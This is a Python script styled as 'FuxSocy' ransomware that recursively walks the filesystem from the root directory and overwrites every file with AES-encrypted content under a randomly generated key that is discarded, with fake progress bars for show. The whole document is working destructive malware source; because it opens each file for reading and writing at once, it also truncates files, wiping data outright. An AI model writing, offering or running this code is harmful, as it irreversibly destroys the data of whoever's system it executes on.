#!/usr/bin/python3

import os
import time
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from random import SystemRandom
from string import ascii_letters, digits, punctuation

START_DIR = '/'
SALT = 'fsociety'
CS = 64*1024


def encrypt(root, filename, key):
    file_path = root + '/' + filename
    file_size = str(os.path.getsize(file_path)).zfill(16)
    iv = Random.new().read(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as infile:
        with open(file_path, 'wb') as outfile:
            outfile.write(file_size.encode('utf-8'))
            outfile.write(iv)
            while True:
                chunk = infile.read(CS)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))
    pass


def recurse(directory, key):
    root = next(os.walk(directory))[0]
    directories = next(os.walk(directory))[1]
    files = next(os.walk(directory))[2]

    for file in files:
        encrypt(root, file, key)

    if len(directories) > 0:
        for directory in directories:
            subdirectories = next(os.walk(os.path.join(root, directory)))[1]
            subfiles = next(os.walk(os.path.join(root, directory)))[2]
            for subfile in subfiles:
                encrypt(next(os.walk(os.path.join(root, directory)))[0], subfile, key)
            if len(subdirectories) > 0:
                for subdirectory in subdirectories:
                    path = root + '/' + directory + '/' + subdirectory
                    try:
                        recurse(directory=path, key=key)
                    except UnicodeEncodeError:
                        pass


def gen_key(salt):
    os.urandom(16)
    print('Loading Source of Entropy')
    password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160)))) for x in range(SystemRandom().randint(80, 120)))
    update_progress(0.3)
    time.sleep(0.4)
    update_progress(0.6)
    time.sleep(0.2)
    update_progress(1)
    print()
    print('\nGenerating Keys')
    update_progress(0.3)
    hasher = SHA256.new(password.encode('utf-8'))
    time.sleep(0.6)
    update_progress(0.5)
    time.sleep(0.6)
    update_progress(1)
    print()
    print()
    return hasher.digest()


def update_progress(progress):
    barLength = 23
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if progress >= 1:
        progress = 1
        status = "COMPLETE"
    block = int(round(barLength*progress))
    text = "\r{0}\t\t{1}".format("#"*block + " "*(barLength-block), status)
    sys.stdout.write(text)
    sys.stdout.flush()


def pwn():
    subprocess.call('clear')
    print('Executing FuxSocy')
    key = gen_key(SALT)
    print('Locating target files.')
    dirs = next(os.walk(START_DIR))[1]
    time.sleep(0.7)
    print('beginning crypto operations')
    for dir in dirs:
        if START_DIR == '/':
            directory = START_DIR + dir
        else:
            directory = START_DIR + '/' + dir
        print('Encrypting {}'.format(directory))
        recurse(directory, key)
    files = next(os.walk(START_DIR))[2]
    for file in files:
        encrypt(START_DIR, file, key)
    del key
    exit(0)


if __name__ == '__main__':
    pwn()
